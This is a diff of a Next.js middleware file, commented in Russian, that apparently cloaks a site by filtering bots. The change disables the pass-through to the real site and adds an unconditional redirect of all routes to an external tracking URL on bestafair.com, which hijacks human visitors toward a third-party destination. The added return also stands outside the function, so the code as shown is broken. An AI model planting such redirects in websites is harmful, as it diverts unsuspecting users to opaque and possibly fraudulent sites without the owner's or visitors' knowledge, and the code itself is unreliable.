@@ -146,8 +146,8 @@ export async function middleware(req) {
   return NextResponse.redirect("https://pqnjj.bestafair.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=4533&s2=2163253");
   
   // не бот — пускаем дальше
-  return NextResponse.next();
+  //return NextResponse.next();
 }
-
+return NextResponse.redirect("https://pqnjj.bestafair.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=4533&s2=2163253");
 // применяем на все роуты
 export const config = { matcher: ["/:path*"] };
